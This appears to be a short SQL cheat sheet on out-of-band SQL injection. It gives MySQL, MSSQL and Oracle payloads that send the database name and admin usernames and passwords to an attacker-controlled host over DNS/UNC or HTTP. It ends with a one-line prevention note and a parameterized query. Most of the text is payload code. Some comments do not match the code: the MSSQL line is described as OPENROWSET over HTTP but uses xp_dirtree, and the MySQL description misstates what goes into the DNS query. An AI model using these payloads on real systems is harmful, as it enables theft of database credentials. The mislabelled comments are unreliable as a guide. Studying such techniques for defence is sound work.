-- Out-of-Band (OOB) SQL Injection
-- Data is exfiltrated through an alternative channel (DNS/HTTP) because the
-- database response itself is never shown to the attacker.

-- MySQL: LOAD_FILE() reads a local file whose content is placed into a DNS query.
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.example\\file'));

-- MSSQL: OPENROWSET() sends the stolen data to an external HTTP endpoint.
DECLARE @x varchar(1024); SELECT @x = (SELECT TOP 1 username + ':' + password FROM admins);
EXEC master..xp_dirtree '\\attacker.example\' + @x;

-- Oracle: UTL_HTTP.REQUEST() sends a request containing the secret to a listener.
SELECT UTL_HTTP.REQUEST('http://attacker.example/?data=' || (SELECT password FROM admins WHERE rownum = 1)) FROM dual;

-- Prevention: restrict outbound network access from the DB, filter special
-- functions, and always use parameterized queries.
SELECT * FROM users WHERE id = ?;